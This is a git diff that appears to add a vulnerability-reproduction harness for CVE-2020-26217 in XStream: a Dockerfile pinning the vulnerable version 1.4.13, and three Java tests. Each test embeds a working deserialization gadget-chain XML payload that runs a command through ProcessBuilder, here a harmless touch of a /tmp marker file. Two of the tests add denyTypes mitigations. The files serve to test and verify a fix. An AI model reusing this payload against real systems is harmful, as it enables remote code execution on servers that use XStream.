diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 00000000..69a4f3bf
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,25 @@
+FROM ubuntu:22.04
+ENV DEBIAN_FRONTEND=noninteractive
+RUN apt -y update
+RUN apt install -y curl unzip wget git build-essential
+RUN mkdir -p /java-env
+ENV WORKSPACE_BASE="/"
+COPY ./java-env/jdk1.8.0_202 $WORKSPACE_BASE/java-env/jdk1.8.0_202
+COPY ./java-env/gradle-6.8.2 $WORKSPACE_BASE/java-env/gradle-6.8.2
+ENV PATH=$PATH:$WORKSPACE_BASE/java-env/gradle-6.8.2/bin:$WORKSPACE_BASE/java-env/jdk1.8.0_202/bin
+ENV JAVA_HOME=$WORKSPACE_BASE/java-env/jdk1.8.0_202
+ENV PATH=$PATH:$JAVA_HOME/bin
+COPY ./project-sources/x-stream__xstream_CVE-2020-26217_1.4.14-java7 /project
+COPY ./resources/my-agent/target/agent-fat.jar /project/.agent-fat.jar
+ENV JAVA_TOOL_OPTIONS="-javaagent:/project/.agent-fat.jar"
+WORKDIR /project
+# Do not modify anything above this line
+RUN mkdir -p /project/test
+WORKDIR /project/test
+RUN wget https://repo1.maven.org/maven2/com/thoughtworks/xstream/xstream/1.4.13/xstream-1.4.13.jar
+RUN wget https://repo1.maven.org/maven2/xpp3/xpp3/1.1.4c/xpp3-1.1.4c.jar
+RUN wget https://repo1.maven.org/maven2/xmlpull/xmlpull/1.1.3.1/xmlpull-1.1.3.1.jar
+COPY ./project-sources/x-stream__xstream_CVE-2020-26217_1.4.14-java7/test/CVE_2020_26217_Test.java /project/test/
+COPY ./project-sources/x-stream__xstream_CVE-2020-26217_1.4.14-java7/test/CVE_2020_26217_Test_Fixed.java /project/test/
+RUN javac -cp "xstream-1.4.13.jar:xmlpull-1.1.3.1.jar:xpp3-1.1.4c.jar" CVE_2020_26217_Test.java CVE_2020_26217_Test_Fixed.java
+CMD java -cp "xstream-1.4.13.jar:xmlpull-1.1.3.1.jar:xpp3-1.1.4c.jar:." CVE_2020_26217_Test
\ No newline at end of file
diff --git a/test/CVE_2020_26217_Test.java b/test/CVE_2020_26217_Test.java
new file mode 100644
index 00000000..33f1e86c
--- /dev/null
+++ b/test/CVE_2020_26217_Test.java
@@ -0,0 +1,99 @@
+import com.thoughtworks.xstream.XStream;
+import java.io.File;
+
+public class CVE_2020_26217_Test {
+    public static void main(String[] args) {
+        // Create a temporary file to check if command was executed
+        File tempFile = new File("/tmp/xstream_cve_2020_26217_test");
+        if (tempFile.exists()) {
+            tempFile.delete();
+        }
+        
+        // Malicious XML that attempts to execute a command to create a file
+        String xml = "<map>\n" +
+                "  <entry>\n" +
+                "    <jdk.nashorn.internal.objects.NativeString>\n" +
+                "      <flags>0</flags>\n" +
+                "      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n" +
+                "        <dataHandler>\n" +
+                "          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
+                "            <contentType>text/plain</contentType>\n" +
+                "            <is class='java.io.SequenceInputStream'>\n" +
+                "              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\n" +
+                "                <iterator class='javax.imageio.spi.FilterIterator'>\n" +
+                "                  <iter class='java.util.ArrayList$Itr'>\n" +
+                "                    <cursor>0</cursor>\n" +
+                "                    <lastRet>-1</lastRet>\n" +
+                "                    <expectedModCount>1</expectedModCount>\n" +
+                "                    <outer-class>\n" +
+                "                      <java.lang.ProcessBuilder>\n" +
+                "                        <command>\n" +
+                "                          <string>touch</string>\n" +
+                "                          <string>/tmp/xstream_cve_2020_26217_test</string>\n" +
+                "                        </command>\n" +
+                "                      </java.lang.ProcessBuilder>\n" +
+                "                    </outer-class>\n" +
+                "                  </iter>\n" +
+                "                  <filter class='javax.imageio.ImageIO$ContainsFilter'>\n" +
+                "                    <method>\n" +
+                "                      <class>java.lang.ProcessBuilder</class>\n" +
+                "                      <name>start</name>\n" +
+                "                      <parameter-types/>\n" +
+                "                    </method>\n" +
+                "                    <name>start</name>\n" +
+                "                  </filter>\n" +
+                "                  <next/>\n" +
+                "                </iterator>\n" +
+                "                <type>KEYS</type>\n" +
+                "              </e>\n" +
+                "              <in class='java.io.ByteArrayInputStream'>\n" +
+                "                <buf></buf>\n" +
+                "                <pos>0</pos>\n" +
+                "                <mark>0</mark>\n" +
+                "                <count>0</count>\n" +
+                "              </in>\n" +
+                "            </is>\n" +
+                "            <consumed>false</consumed>\n" +
+                "          </dataSource>\n" +
+                "          <transferFlavors/>\n" +
+                "        </dataHandler>\n" +
+                "        <dataLen>0</dataLen>\n" +
+                "      </value>\n" +
+                "    </jdk.nashorn.internal.objects.NativeString>\n" +
+                "    <string>test</string>\n" +
+                "  </entry>\n" +
+                "</map>";
+
+        try {
+            System.out.println("Starting CVE-2020-26217 vulnerability test...");
+            
+            // Create XStream instance with default security settings (vulnerable configuration)
+            XStream xstream = new XStream();
+            System.out.println("Created XStream instance with default security settings");
+            
+            // Try to deserialize the malicious XML
+            try {
+                System.out.println("Attempting to deserialize malicious XML...");
+                Object result = xstream.fromXML(xml);
+                System.out.println("Deserialization completed without exceptions.");
+            } catch (Exception e) {
+                System.out.println("Exception during deserialization: " + e.getMessage());
+                // Even if there's an exception, the command might have been executed
+            }
+            
+            // Check if the file was created (indicating successful exploitation)
+            if (tempFile.exists()) {
+                System.out.println("VULNERABILITY DETECTED: Command was executed successfully!");
+                System.exit(1); // Test fails if vulnerability exists
+            } else {
+                System.out.println("No vulnerability detected. Command was not executed.");
+                System.exit(0); // Test passes if vulnerability does not exist
+            }
+            
+        } catch (Exception e) {
+            System.out.println("Unexpected error: " + e.getMessage());
+            e.printStackTrace();
+            System.exit(1);
+        }
+    }
+}
\ No newline at end of file
diff --git a/test/CVE_2020_26217_Test_Fixed.java b/test/CVE_2020_26217_Test_Fixed.java
new file mode 100644
index 00000000..40a4ac2d
--- /dev/null
+++ b/test/CVE_2020_26217_Test_Fixed.java
@@ -0,0 +1,104 @@
+import com.thoughtworks.xstream.XStream;
+import java.io.File;
+
+public class CVE_2020_26217_Test_Fixed {
+    public static void main(String[] args) {
+        // Create a temporary file to check if command was executed
+        File tempFile = new File("/tmp/xstream_cve_2020_26217_test");
+        if (tempFile.exists()) {
+            tempFile.delete();
+        }
+        
+        // Malicious XML that attempts to execute a command to create a file
+        String xml = "<map>\n" +
+                "  <entry>\n" +
+                "    <jdk.nashorn.internal.objects.NativeString>\n" +
+                "      <flags>0</flags>\n" +
+                "      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n" +
+                "        <dataHandler>\n" +
+                "          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
+                "            <contentType>text/plain</contentType>\n" +
+                "            <is class='java.io.SequenceInputStream'>\n" +
+                "              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\n" +
+                "                <iterator class='javax.imageio.spi.FilterIterator'>\n" +
+                "                  <iter class='java.util.ArrayList$Itr'>\n" +
+                "                    <cursor>0</cursor>\n" +
+                "                    <lastRet>-1</lastRet>\n" +
+                "                    <expectedModCount>1</expectedModCount>\n" +
+                "                    <outer-class>\n" +
+                "                      <java.lang.ProcessBuilder>\n" +
+                "                        <command>\n" +
+                "                          <string>touch</string>\n" +
+                "                          <string>/tmp/xstream_cve_2020_26217_test</string>\n" +
+                "                        </command>\n" +
+                "                      </java.lang.ProcessBuilder>\n" +
+                "                    </outer-class>\n" +
+                "                  </iter>\n" +
+                "                  <filter class='javax.imageio.ImageIO$ContainsFilter'>\n" +
+                "                    <method>\n" +
+                "                      <class>java.lang.ProcessBuilder</class>\n" +
+                "                      <name>start</name>\n" +
+                "                      <parameter-types/>\n" +
+                "                    </method>\n" +
+                "                    <name>start</name>\n" +
+                "                  </filter>\n" +
+                "                  <next/>\n" +
+                "                </iterator>\n" +
+                "                <type>KEYS</type>\n" +
+                "              </e>\n" +
+                "              <in class='java.io.ByteArrayInputStream'>\n" +
+                "                <buf></buf>\n" +
+                "                <pos>0</pos>\n" +
+                "                <mark>0</mark>\n" +
+                "                <count>0</count>\n" +
+                "              </in>\n" +
+                "            </is>\n" +
+                "            <consumed>false</consumed>\n" +
+                "          </dataSource>\n" +
+                "          <transferFlavors/>\n" +
+                "        </dataHandler>\n" +
+                "        <dataLen>0</dataLen>\n" +
+                "      </value>\n" +
+                "    </jdk.nashorn.internal.objects.NativeString>\n" +
+                "    <string>test</string>\n" +
+                "  </entry>\n" +
+                "</map>";
+
+        try {
+            System.out.println("Starting CVE-2020-26217 vulnerability test with fixed version...");
+            
+            // Create XStream instance with fixed security settings
+            XStream xstream = new XStream();
+            
+            // Apply the security fix by denying the vulnerable classes
+            xstream.denyTypes(new String[]{ "javax.imageio.ImageIO$ContainsFilter" });
+            xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class });
+            
+            System.out.println("Created XStream instance with fixed security settings");
+            
+            // Try to deserialize the malicious XML
+            try {
+                System.out.println("Attempting to deserialize malicious XML...");
+                Object result = xstream.fromXML(xml);
+                System.out.println("Deserialization completed without exceptions.");
+            } catch (Exception e) {
+                System.out.println("Exception during deserialization: " + e.getMessage());
+                // This is expected with the security fix
+            }
+            
+            // Check if the file was created (indicating successful exploitation)
+            if (tempFile.exists()) {
+                System.out.println("VULNERABILITY DETECTED: Command was executed successfully!");
+                System.exit(1); // Test fails if vulnerability exists
+            } else {
+                System.out.println("No vulnerability detected. Command was not executed.");
+                System.exit(0); // Test passes if vulnerability does not exist
+            }
+            
+        } catch (Exception e) {
+            System.out.println("Unexpected error: " + e.getMessage());
+            e.printStackTrace();
+            System.exit(1);
+        }
+    }
+}
\ No newline at end of file
diff --git a/test/CVE_2020_26217_Test_Patched.java b/test/CVE_2020_26217_Test_Patched.java
new file mode 100644
index 00000000..1df3c15c
--- /dev/null
+++ b/test/CVE_2020_26217_Test_Patched.java
@@ -0,0 +1,104 @@
+import com.thoughtworks.xstream.XStream;
+import java.io.File;
+
+public class CVE_2020_26217_Test_Patched {
+    public static void main(String[] args) {
+        // Create a temporary file to check if command was executed
+        File tempFile = new File("/tmp/xstream_cve_2020_26217_test");
+        if (tempFile.exists()) {
+            tempFile.delete();
+        }
+        
+        // Malicious XML that attempts to execute a command to create a file
+        String xml = "<map>\n" +
+                "  <entry>\n" +
+                "    <jdk.nashorn.internal.objects.NativeString>\n" +
+                "      <flags>0</flags>\n" +
+                "      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n" +
+                "        <dataHandler>\n" +
+                "          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
+                "            <contentType>text/plain</contentType>\n" +
+                "            <is class='java.io.SequenceInputStream'>\n" +
+                "              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\n" +
+                "                <iterator class='javax.imageio.spi.FilterIterator'>\n" +
+                "                  <iter class='java.util.ArrayList$Itr'>\n" +
+                "                    <cursor>0</cursor>\n" +
+                "                    <lastRet>-1</lastRet>\n" +
+                "                    <expectedModCount>1</expectedModCount>\n" +
+                "                    <outer-class>\n" +
+                "                      <java.lang.ProcessBuilder>\n" +
+                "                        <command>\n" +
+                "                          <string>touch</string>\n" +
+                "                          <string>/tmp/xstream_cve_2020_26217_test</string>\n" +
+                "                        </command>\n" +
+                "                      </java.lang.ProcessBuilder>\n" +
+                "                    </outer-class>\n" +
+                "                  </iter>\n" +
+                "                  <filter class='javax.imageio.ImageIO$ContainsFilter'>\n" +
+                "                    <method>\n" +
+                "                      <class>java.lang.ProcessBuilder</class>\n" +
+                "                      <name>start</name>\n" +
+                "                      <parameter-types/>\n" +
+                "                    </method>\n" +
+                "                    <name>start</name>\n" +
+                "                  </filter>\n" +
+                "                  <next/>\n" +
+                "                </iterator>\n" +
+                "                <type>KEYS</type>\n" +
+                "              </e>\n" +
+                "              <in class='java.io.ByteArrayInputStream'>\n" +
+                "                <buf></buf>\n" +
+                "                <pos>0</pos>\n" +
+                "                <mark>0</mark>\n" +
+                "                <count>0</count>\n" +
+                "              </in>\n" +
+                "            </is>\n" +
+                "            <consumed>false</consumed>\n" +
+                "          </dataSource>\n" +
+                "          <transferFlavors/>\n" +
+                "        </dataHandler>\n" +
+                "        <dataLen>0</dataLen>\n" +
+                "      </value>\n" +
+                "    </jdk.nashorn.internal.objects.NativeString>\n" +
+                "    <string>test</string>\n" +
+                "  </entry>\n" +
+                "</map>";
+
+        try {
+            System.out.println("Starting CVE-2020-26217 vulnerability test with security patch...");
+            
+            // Create XStream instance with patched security settings
+            XStream xstream = new XStream();
+            
+            // Apply the security patch by denying the vulnerable classes
+            xstream.denyTypes(new String[]{ "javax.imageio.ImageIO$ContainsFilter" });
+            xstream.denyTypes(new Class[]{ java.lang.ProcessBuilder.class });
+            
+            System.out.println("Created XStream instance with patched security settings");
+            
+            // Try to deserialize the malicious XML
+            try {
+                System.out.println("Attempting to deserialize malicious XML...");
+                Object result = xstream.fromXML(xml);
+                System.out.println("Deserialization completed without exceptions.");
+            } catch (Exception e) {
+                System.out.println("Exception during deserialization: " + e.getMessage());
+                // This is expected with the security patch
+            }
+            
+            // Check if the file was created (indicating successful exploitation)
+            if (tempFile.exists()) {
+                System.out.println("VULNERABILITY DETECTED: Command was executed successfully!");
+                System.exit(1); // Test fails if vulnerability exists
+            } else {
+                System.out.println("No vulnerability detected. Command was not executed.");
+                System.exit(0); // Test passes if vulnerability does not exist
+            }
+            
+        } catch (Exception e) {
+            System.out.println("Unexpected error: " + e.getMessage());
+            e.printStackTrace();
+            System.exit(1);
+        }
+    }
+}
\ No newline at end of file
